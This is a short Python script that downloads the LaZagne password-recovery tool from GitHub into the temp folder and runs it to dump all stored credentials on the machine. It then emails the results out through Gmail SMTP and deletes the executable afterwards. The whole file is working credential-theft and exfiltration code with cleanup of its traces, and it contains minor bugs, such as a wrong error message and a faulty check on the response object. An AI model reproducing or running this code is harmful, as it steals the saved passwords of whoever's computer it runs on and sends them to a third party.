#!/usr/bin/env python

import requests, subprocess, smtplib, os, tempfile
import argparse

# Create function to pass arguments while calling the program
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--user-name", dest="username", help="Set GMail Username")
    parser.add_argument("-p", "--password", dest="password", help="Set GMail Password")
    parser.add_argument("-e", "--to-email", dest="email", help="Set email address to mail report to")
    options = parser.parse_args()
    if not options.username:
        parser.error("[-] Please specify a gmail username using -u or --user-name options, use --help for more info.")
    elif not options.password:
        parser.error("[-] Please specify a gmail password using -p or --password options, use --help for more info.")
    elif not options.email:
        parser.error("[-] Please specify email address for report using -s or --spoof-ip options, use --help for more info.")
    return options


def send_mail(username, password, email, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(username, password)
    server.sendmail(email, email, message)
    server.quit()


def download(url):
    get_response = requests.get(url)
    if "/" in get_response:
        file_name = url.split('/')[-1]
    with open(file_name, "wb") as output_file:
        output_file.write(get_response.content)

tmp_dir = tempfile.gettempdir() # Get temporary directory
os.chdir(tmp_dir)   # Change working directory

# Call the download function
download("https://github.com/AlessandroZ/LaZagne/releases/download/2.4/laZagne.exe")

command = "laZagne.exe all"
result = subprocess.check_output(command, shell=True)

options = get_arguments()
send_mail(options.username, options.password, options.email, result)
os.remove("laZagne.exe")
